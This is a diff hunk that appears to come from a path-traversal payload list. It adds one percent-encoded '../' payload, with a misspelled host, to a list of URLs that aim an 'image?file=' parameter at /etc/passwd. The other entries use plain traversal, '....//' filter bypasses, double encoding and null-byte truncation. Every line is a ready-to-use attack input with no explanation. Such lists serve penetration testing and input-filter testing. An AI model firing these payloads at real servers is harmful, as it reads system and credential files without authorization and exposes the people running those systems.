@@ -12,6 +12,7 @@ https://vulnerable.com/image?file=/etc/passwd
 https://vulnerable.com/image?file=../../../etc/passwd
 https://vulnerable.com/image?file=....//....//....//etc/passwd
 https://vulnerable.com/image?file=..%252f..%252f..%252fetc/passwd
+https://vulenrable.com/image?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
 https://vulnerable.com/image?file=/var/www/images/../../../etc/passwd
 https://vulnerable.com/image?file=/etc/passwd%00.png
 https://vulnerable.com/image?file=../../../etc/passwd%00.png
